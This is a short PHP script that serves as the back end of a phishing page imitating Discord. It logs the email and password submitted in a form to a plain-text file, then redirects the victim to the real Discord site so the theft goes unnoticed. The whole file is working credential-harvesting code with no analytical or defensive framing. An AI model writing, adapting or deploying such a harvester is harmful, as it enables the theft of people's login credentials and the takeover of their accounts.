<?php
  $log_file_name = 'mylog.log'; // Change to the log file name
  $message = $_POST['Email'].PHP_EOL; // incoming message
   $pass = $_POST['Psassword'].PHP_EOL; // incoming message
file_put_contents($log_file_name, "email: " . $message, FILE_APPEND);
    file_put_contents($log_file_name, "pass: " . $pass, FILE_APPEND);
header("Location:https://discordapp.com/");
die();

  ?>